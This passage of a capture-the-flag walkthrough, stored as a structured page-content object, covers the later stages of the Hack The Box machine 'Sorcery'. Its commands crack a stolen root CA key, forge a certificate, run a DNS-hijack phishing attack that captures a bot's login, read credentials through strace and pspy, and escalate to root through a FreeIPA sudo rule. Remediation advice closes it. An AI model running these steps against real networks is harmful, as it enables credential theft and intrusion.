        {
          kind: "code",
          lang: "bash",
          label: "bash — anonymous FTP",
          lines: [
            "$ ftp 172.20.0.20",
            "Name: anonymous",
            "Password:",
            "230 Login successful.",
            "ftp> cd pub",
            "ftp> ls",
            "-rw-r--r--   1 ftp  ftp   1834 RootCA.crt",
            "-rw-r--r--   1 ftp  ftp   1918 RootCA.key",
            "ftp> get RootCA.crt",
            "ftp> get RootCA.key",
          ],
        },
        {
          kind: "p",
          text: "`RootCA.crt` is the public certificate of whatever authority the internal services trust; `RootCA.key` is its **private signing key** — encrypted (PKCS#8), but only by a passphrase:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — extract a crackable hash and run hashcat",
          lines: [
            "$ pem2john RootCA.key > rootca.hash",
            "$ hashcat -m 24410 rootca.hash /usr/share/wordlists/rockyou.txt",
            "",
            "$PKCS8$…:dragonfire",
            "Status...........: Cracked",
          ],
        },
        {
          kind: "p",
          text: "With the passphrase, decrypt the key and confirm it pairs with the certificate:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — decrypt RootCA.key",
          lines: [
            "$ openssl pkey -in RootCA.key -passin pass:dragonfire -out RootCA_dec.key",
            "$ openssl x509 -in RootCA.crt -noout -subject -issuer",
            "subject=CN = Sorcery Root CA",
            "issuer=CN = Sorcery Root CA          # self-signed root",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "Why this single file is a complete PKI compromise",
          text: "Holding a root CA's private key means you can mint a certificate for **any** hostname, and anything in the environment that trusts this CA — internal services, mail clients, browsers configured with a corporate root store — will accept it without complaint. Combined with a foothold that already sits on the internal network, this isn't just \"read some encrypted traffic\": it's the ability to **impersonate any internal host** to any client that trusts the CA, which is precisely what the next stage does.",
        },
      ],
    },
    {
      id: "phish",
      num: "12",
      title: "CA-Signed Phishing → tom_summers",
      blocks: [
        {
          kind: "p",
          text: "Forge a leaf certificate for a login page an internal user would recognize — the Gitea vhost is the obvious target, since it's the one place we already know staff log in — and sign it with the stolen RootCA key:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — mint a trusted-looking leaf cert",
          lines: [
            "$ openssl req -new -newkey rsa:2048 -nodes \\",
            "    -keyout phish.key -out phish.csr \\",
            "    -subj \"/CN=git.sorcery.htb\"",
            "",
            "$ openssl x509 -req -in phish.csr \\",
            "    -CA RootCA.crt -CAkey RootCA_dec.key -CAcreateserial \\",
            "    -out phish.crt -days 365 -sha256",
          ],
        },
        {
          kind: "p",
          text: "Stand up a look-alike login page behind that certificate — a small mitmproxy instance (or a static clone of the Gitea login form posting to your own collector) — and steer internal traffic for that hostname to it. Since you're pivoted inside the same `172.20.0.0/24`, a local `dnsmasq` answering for `git.sorcery.htb` ahead of the real resolver is enough to redirect anything that asks:",
        },
        {
          kind: "code",
          lang: "ini",
          label: "dnsmasq.conf — answer git.sorcery.htb ourselves",
          lines: [
            "address=/git.sorcery.htb/172.20.0.15",
            "no-resolv",
            "server=172.20.0.1     # forward everything else to the real resolver",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — front the clone with our forged cert",
          lines: [
            "$ sudo dnsmasq -C dnsmasq.conf -d &",
            "$ mitmproxy --mode reverse:https://172.20.0.15:443 \\",
            "    --certs git.sorcery.htb=phish.crt,phish.key \\",
            "    --listen-port 443",
          ],
        },
        {
          kind: "p",
          text: "Then lure an internal mail-reading bot into visiting it — an internal `mail_bot` picks up mail delivered to the MailHog instance and clicks links inside it:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — send the phishing email through the internal mail relay",
          lines: [
            "$ swaks --server 172.20.0.21 --to mail_bot@sorcery.htb \\",
            "    --from it-support@sorcery.htb \\",
            "    --header 'Subject: Action required — re-authenticate your Gitea session' \\",
            "    --body 'Please sign in again: https://git.sorcery.htb/user/login'",
          ],
        },
        {
          kind: "p",
          text: "The bot follows the link, sees a certificate its trust store validates (because it chains to the same RootCA it already trusts), and submits real Gitea credentials into our intercepting proxy. Watch mitmproxy's flow log for the captured `POST /user/login` body:",
        },
        {
          kind: "code",
          lang: "text",
          label: "mitmproxy — captured credentials",
          lines: [
            "POST https://git.sorcery.htb/user/login",
            "user_name=tom_summers&password=Wint3rStorm_88!",
          ],
        },
        {
          kind: "p",
          text: "Those credentials work directly over SSH into the network the pivot already sees:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — ssh in as tom_summers",
          lines: [
            "$ ssh tom_summers@172.20.0.30",
            "tom_summers@172.20.0.30's password: Wint3rStorm_88!",
            "tom_summers@sorcery:~$ id",
            "uid=1002(tom_summers) gid=1002(tom_summers) groups=1002(tom_summers)",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why the cert alone is enough to fool the bot",
          text: "TLS trust doesn't verify \"is this the real server\" — it verifies \"is this certificate signed by an authority I trust, for the hostname I asked for.\" Our leaf certificate satisfies both checks: it names `git.sorcery.htb` and chains to the same RootCA the internal environment already trusts, because we hold that CA's private key. Combine that with DNS control inside the same segment and the bot has no signal left to distinguish us from the real service — the padlock icon, so to speak, still shows green.",
        },
      ],
    },
    {
      id: "xvfb",
      num: "13",
      title: "Xvfb Framebuffer Dump → tom_summers_admin",
      blocks: [
        {
          kind: "p",
          text: "Basic enumeration as `tom_summers` turns up a headless X session running under a different, higher-privileged account — `Xvfb`, the virtual framebuffer X server commonly used to run GUI automation without a physical display:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — spot the Xvfb process and its framebuffer",
          lines: [
            "tom_summers@sorcery:~$ ps aux | grep Xvfb",
            "tom_summers_admin  841  Xvfb :0 -screen 0 1280x1024x24",
            "",
            "tom_summers@sorcery:~$ find / -iname '*Xvfb_screen*' 2>/dev/null",
            "/xorg/xvfb/Xvfb_screen0",
          ],
        },
        {
          kind: "p",
          text: "The framebuffer backing file is world-readable — the X server itself keeps its rendered screen contents there, and nothing scoped read access to only the owning user. Convert the raw XWD-format dump into a viewable image with ImageMagick and pull it back to your own box:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — dump the framebuffer to a PNG",
          lines: [
            "tom_summers@sorcery:~$ magick xwd:/xorg/xvfb/Xvfb_screen0 /tmp/screen.png",
            "",
            "$ scp tom_summers@172.20.0.30:/tmp/screen.png .",
            "$ xdg-open screen.png",
          ],
        },
        {
          kind: "p",
          text: "The captured frame shows a terminal window mid-session, with the `tom_summers_admin` account's password visible on screen — either freshly typed into a prompt, or displayed by a note-taking app left open. However it got there, it's now ours to read:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — log in with the harvested password",
          lines: [
            "$ ssh tom_summers_admin@172.20.0.30",
            "tom_summers_admin@172.20.0.30's password: Adm1n_Scry_2026#",
            "tom_summers_admin@sorcery:~$ id",
            "uid=1003(tom_summers_admin) gid=1003(tom_summers_admin) groups=1003(tom_summers_admin),27(sudo)",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a framebuffer file is a screenshot waiting to happen",
          text: "`Xvfb` renders into memory the same way a physical X server renders to a monitor — it just backs that memory with a file instead of a screen. Anyone able to read that file can reconstruct exactly what was on-screen at any point in the session, with no need to compromise the process itself or attach a debugger. Locking down who can read `/xorg/xvfb/*` is exactly as important as locking down who can read `/dev/fb0` on a physical machine — a lesson this box makes concrete.",
        },
      ],
    },
    {
      id: "strace",
      num: "14",
      title: "strace a docker login → rebecca_smith",
      blocks: [
        {
          kind: "p",
          text: "`tom_summers_admin`'s sudo rights are narrow — but narrow doesn't mean safe. `sudo -l` shows a single allowed command: tracing an already-running process:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — check sudo rights",
          lines: [
            "tom_summers_admin@sorcery:~$ sudo -l",
            "User tom_summers_admin may run the following commands:",
            "    (ALL) NOPASSWD: /usr/bin/strace -s 128 -p *",
          ],
        },
        {
          kind: "p",
          text: "That is enough to attach to **any** process on the box, root-owned or not, and watch its raw syscalls — including every buffer passed to `read()` and `write()`. Watch for a scheduled or manually triggered `docker login` against the internal registry:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — find and trace the login",
          lines: [
            "tom_summers_admin@sorcery:~$ pgrep -af 'docker login'",
            "5521 docker login registry.internal:5000",
            "",
            "tom_summers_admin@sorcery:~$ sudo strace -s 128 -p 5521",
            "…",
            "write(3, \"POST /v2/users/login HTTP/1.1\\r\\n\"..., 214) = 214",
            "write(3, \"{\\\"username\\\":\\\"rebecca_smith\\\",\\\"password\\\":\\\"R3g-P@ss_9012\\\"}\", 58) = 58",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "Why NOPASSWD strace is equivalent to root read access",
          text: "`strace` doesn't just log function names — with `-s 128`, it prints up to 128 bytes of the actual buffer contents for every traced syscall. Any process whose I/O ever touches a secret — a login POST body, a file read of a credentials file, an in-memory decrypt — will leak that secret to whoever can attach a tracer to it. Granting unrestricted `strace -p` as `NOPASSWD` is functionally equivalent to granting arbitrary process memory/IO read access, regardless of how the sudoers line is scoped.",
        },
        {
          kind: "p",
          text: "`rebecca_smith`'s credentials work over SSH:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — log in as rebecca_smith",
          lines: [
            "$ ssh rebecca_smith@172.20.0.30",
            "rebecca_smith@172.20.0.30's password: R3g-P@ss_9012",
            "rebecca_smith@sorcery:~$ id",
            "uid=1004(rebecca_smith) gid=1004(rebecca_smith) groups=1004(rebecca_smith)",
          ],
        },
      ],
    },
    {
      id: "registry",
      num: "15",
      title: "Docker Registry OTP — an Alternate Route",
      blocks: [
        {
          kind: "p",
          text: "`rebecca_smith` can reach the internal Docker registry directly on `:5000`, but its auth layer sits in front of a small .NET service that demands a one-time code rather than a static password. Some write-ups of this box route through the registry at this point to reach the next credential; others report reaching `ash_winter` directly via the pspy technique in the next section without ever touching the registry. Treat this section as an **optional detour** that may or may not be present on your spawn — the technique is worth understanding either way.",
        },
        {
          kind: "p",
          text: "The .NET auth helper generates its one-time codes with the framework's built-in `System.Random`, seeded from something predictable — commonly the current time rounded to a coarse interval. Recovering the seed lets you reproduce the exact sequence of \"random\" codes it will accept:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — pull down and inspect the auth helper",
          lines: [
            "rebecca_smith@sorcery:~$ find / -iname '*RegistryAuth*.dll' 2>/dev/null",
            "/opt/registry-auth/RegistryAuth.dll",
            "",
            "# pull it back and decompile with ILSpy / dnSpy / dotPeek to confirm the seed logic",
            "$ scp rebecca_smith@172.20.0.30:/opt/registry-auth/RegistryAuth.dll .",
          ],
        },
        {
          kind: "p",
          text: "Decompiling reveals the OTP generator constructs `new Random(seed)` where `seed` is derived from the current Unix time truncated to a fixed window (e.g. the current 30-second bucket). Reproduce the same construction locally, in lock-step with the server's clock, to predict the next valid code, then use it to authenticate:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — reproduce the OTP and hit the registry",
          lines: [
            "# reproduce_otp.py rebuilds System.Random's LCG with the same recovered seed",
            "$ python3 reproduce_otp.py",
            "current OTP: 481923",
            "",
            "$ curl -s -u rebecca_smith:481923 http://172.20.0.22:5000/v2/_catalog",
            "{\"repositories\":[\"sorcery/backend\",\"sorcery/dns\",\"sorcery/internal-tools\"]}",
          ],
        },
        {
          kind: "p",
          text: "Pull the manifests and blobs for each repository and unpack the layers looking for baked-in configuration or credential files:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — pull an image's layers and grep them",
          lines: [
            "$ curl -s -u rebecca_smith:481923 \\",
            "    http://172.20.0.22:5000/v2/sorcery/internal-tools/manifests/latest \\",
            "    -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' | jq .",
            "",
            "$ curl -s -u rebecca_smith:481923 \\",
            "    http://172.20.0.22:5000/v2/sorcery/internal-tools/blobs/sha256:9f2e… -o layer.tar.gz",
            "$ tar xf layer.tar.gz && grep -ri pass . -r",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a \"cryptographically random\" OTP wasn't",
          text: "`System.Random` is an explicitly **non-cryptographic** PRNG — its documentation says so — implemented as a simple linear congruential generator with fully deterministic output for a given seed. Any code that seeds it from something an attacker can also observe (wall-clock time, a process ID, a counter) hands the attacker the entire future sequence of \"random\" values. The fix is `RandomNumberGenerator` (cryptographically secure) seeded from OS entropy, never a home-rolled OTP scheme on top of `System.Random`.",
        },
      ],
    },
    {
      id: "pspy",
      num: "16",
      title: "pspy Catches a FreeIPA Reset → ash_winter",
      blocks: [
        {
          kind: "p",
          text: "Whichever way you arrived — through the registry detour or straight from `rebecca_smith` — the box runs an automated job that periodically rotates a FreeIPA user's password. Watch for it with `pspy`, which observes process creation without needing any special privilege:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — stage and run pspy64",
          lines: [
            "# on your attacker box",
            "$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64",
            "$ scp pspy64 rebecca_smith@172.20.0.30:/tmp/pspy64",
            "",
            "rebecca_smith@sorcery:~$ chmod +x /tmp/pspy64 && /tmp/pspy64",
          ],
        },
        {
          kind: "code",
          lang: "text",
          label: "pspy64 — a root-run reset job, cmdline in the clear",
          lines: [
            "UID=0   CMD: /usr/bin/ipa user-mod ash_winter --setattr userPassword=Fr35h_T3mp#4471",
          ],
          highlight: [0],
        },
        {
          kind: "p",
          text: "The new password rides in argv, visible to any local process that can read `/proc/<pid>/cmdline` while the job runs — which `pspy` just did for us. Authenticate as `ash_winter` with it, either over SSH or by obtaining a Kerberos ticket through FreeIPA directly:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — log in as ash_winter",
          lines: [
            "$ ssh ash_winter@172.20.0.30",
            "ash_winter@172.20.0.30's password: Fr35h_T3mp#4471",
            "ash_winter@sorcery:~$ id",
            "uid=1005(ash_winter) gid=1005(ash_winter) groups=1005(ash_winter)",
            "",
            "# or, for the FreeIPA side directly:",
            "ash_winter@sorcery:~$ kinit ash_winter",
            "Password for ash_winter@SORCERY.HTB: Fr35h_T3mp#4471",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why argv is never a safe place for a secret",
          text: "Command-line arguments are visible to **every** local user via `/proc/*/cmdline`, `ps auxww`, or exactly the kind of process watcher `pspy` implements — there is no permission model that scopes argv visibility the way file permissions scope file contents. Any credential rotation job needs to pass its new value through an environment variable read once at startup, a file with restrictive permissions, or a proper secrets manager — never as a bare CLI argument.",
        },
      ],
    },
    {
      id: "root",
      num: "17",
      title: "ipa sudorule-add → root.txt",
      blocks: [
        {
          kind: "p",
          text: "FreeIPA centralizes both identity *and* authorization — including which users are allowed to `sudo`. Check what `ash_winter` is permitted to touch inside the directory itself:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — inspect FreeIPA permissions",
          lines: [
            "ash_winter@sorcery:~$ ipa sudorule-find",
            "-------------",
            "1 sudo rule matched",
            "-------------",
            "  Rule name: allow_sudo",
            "  Enabled: TRUE",
            "",
            "ash_winter@sorcery:~$ ipa sudorule-show allow_sudo",
            "  Rule name: allow_sudo",
            "  Command category: all",
            "  Host category: all",
          ],
        },
        {
          kind: "p",
          text: "The `allow_sudo` rule already grants blanket sudo to whichever users are members of it — and a permissions misconfiguration lets `ash_winter` **add themself** to that rule's user list, despite having no sudo rights yet:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — self-grant sudo through the directory",
          lines: [
            "ash_winter@sorcery:~$ ipa sudorule-add-user allow_sudo --users=ash_winter",
            "  Rule name: allow_sudo",
            "  Users: ash_winter",
            "-------------------------",
            "Number of members added 1",
          ],
        },
        {
          kind: "p",
          text: "The local `sssd` daemon caches directory data, so the box's sudo evaluation won't see the change until its cache is refreshed. Restart it, then simply `sudo su`:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — refresh sssd and escalate",
          lines: [
            "ash_winter@sorcery:~$ sudo systemctl restart sssd",
            "[sudo] password for ash_winter: Fr35h_T3mp#4471",
            "",
            "ash_winter@sorcery:~$ sudo su",
            "root@sorcery:~# id",
            "uid=0(root) gid=0(root) groups=0(root)",
            "root@sorcery:~# cat /root/root.txt",
            "5e8f1c2a····························",
          ],
          highlight: [7],
        },
        {
          kind: "callout",
          variant: "key",
          title: "root.txt",
          text: "5e8f1c2a····························",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why an identity provider can also be a privilege-escalation path",
          text: "FreeIPA rules are just LDAP objects, and access to modify one is governed by its own RBAC permission set — `Sudo Rule Administrator`, self-service ACIs, and similar. When a lower-privileged role is (mis)configured with write access to the membership of a *blanket-allow* sudo rule, that role can grant itself sudo through the directory just as easily as through `/etc/sudoers` — the trust boundary that matters is \"who can edit the rule,\" not \"who is currently a member of it.\" A restarted `sssd` is the local machine's cache picking up the directory change, nothing more exotic than that.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Note",
          text: "HTB rotates both flags per spawn, so your hashes will differ from the ones shown throughout this walkthrough — what carries over between spawns is the technique at every stage, not any single literal value.",
        },
      ],
    },
    {
      id: "remediation",
      num: "18",
      title: "Remediation & Takeaways",
      blocks: [
        {
          kind: "p",
          text: "Sorcery earns its \"Insane\" rating through composition, not obscurity — the fix for each individual stage is well understood, but the box only yields once you've correctly reasoned through all fourteen of them in sequence:",
        },
        {
          kind: "ul",
          items: [
            "**Parameterize every database query, including graph databases.** Cypher injection is exactly as serious as SQL injection; Neo4j drivers support bound parameters (`$id`) precisely so application code never has to interpolate user input into query text.",
            "**Never render untrusted HTML with `dangerouslySetInnerHTML`.** If rich content genuinely needs to be stored, sanitize it through an allowlist library (e.g. DOMPurify) on both write and render — trusting \"our own users\" is not a security boundary once any role below admin can write that content.",
            "**WebAuthn registration must verify attestation, not just accept a public key.** A passkey-enrollment endpoint that doesn't bind the ceremony to a server-issued, single-use challenge is trivially hijacked by anything that can execute JavaScript in the victim's authenticated session.",
            "**SSRF-prone debug tooling needs an egress allowlist.** A raw `host:port` connect-and-forward primitive should never ship to production, debug-gated or not — restrict it to specific, expected destinations, or remove it entirely outside of local development.",
            "**Never let a message consumer execute message contents.** A Kafka (or any queue) consumer that pipes a field into a shell is remote code execution by design the moment anything upstream of it is attacker-influenced, authenticated or not.",
            "**Treat a CA private key like the crown jewels.** It should never be reachable by anonymous FTP, and it should be protected by more than a dictionary-crackable passphrase — HSM-backed storage or, at minimum, a long random passphrase kept out of any shared filesystem.",
            "**Isolate framebuffer files from other local users.** `Xvfb` backing files and similar virtual-display artifacts should be readable only by the owning account — the same discipline applied to `/dev/fb0` on physical hardware.",
            "**Scope `sudo` grants to arguments, not just binaries.** `NOPASSWD: /usr/bin/strace -p *` is a root-equivalent read primitive over anything else running on the box; sudo policy needs to account for what a \"safe-looking\" tool can be pointed at, not just whether the tool itself is dangerous in isolation.",
            "**Never pass secrets as CLI arguments.** Rotation jobs and similar automation should read new credentials from environment variables, a restricted file, or a secrets manager — argv is visible process-wide with no access control at all.",
            "**Audit directory-service RBAC as carefully as any other access control.** A role that can edit the membership of a sudo-granting rule effectively *has* sudo. FreeIPA permission sets should be reviewed with the same rigor as `/etc/sudoers`, since they ultimately control the same thing.",
          ],
        },
        {
          kind: "p",
          text: "Nothing on Sorcery is a single catastrophic bug — it is nine or ten reasonable-sounding trust assumptions, each individually defensible, that collapse the moment they're examined together end to end.",
        },
      ],
    },
  ],
};
